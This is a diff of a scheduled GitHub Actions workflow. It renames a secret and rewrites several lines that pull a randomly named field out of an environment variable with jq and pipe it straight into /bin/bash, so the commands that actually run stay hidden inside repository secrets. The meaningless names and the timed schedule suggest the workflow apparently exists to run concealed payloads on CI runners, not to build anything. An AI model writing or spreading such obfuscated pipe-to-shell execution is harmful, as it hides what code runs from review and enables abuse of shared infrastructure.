@@ -2,23 +2,20 @@ name: dengfei19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 1/6 * * *'
-
+    - cron: '55 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dengfei19871010
         env:
-          chl09900: ${{ secrets.chl09900 }}
+          pbm76816: ${{ secrets.pbm76816 }}
         run: |
-          echo $chl09900 | jq -r .iryv45 | /bin/bash
-          echo $po02 | jq -r .xat13647 | /bin/bash
-          echo $bmfqy425 | jq -r .xy2825 | /bin/bash
-          echo $oezaf002 | jq -r .rwewt8805 | /bin/bash
-          echo $n32 | jq -r .efj982 | /bin/bash
-          echo $uav33164 | jq -r .gfsw39561 | /bin/bash
-          echo $hdqgu06017 | jq -r .kik7053 | /bin/bash
+          echo $pbm76816 | jq -r .sopel639 | /bin/bash
+          echo $bysqw96328 | jq -r .qtb9508 | /bin/bash
+          echo $uuasn2 | jq -r .dvebp55 | /bin/bash
+          echo $gtun766 | jq -r .wbi25307 | /bin/bash
+          echo $khrd140 | jq -r .mtfoo029 | /bin/bash
+          echo $fph3 | jq -r .shwav5 | /bin/bash
 
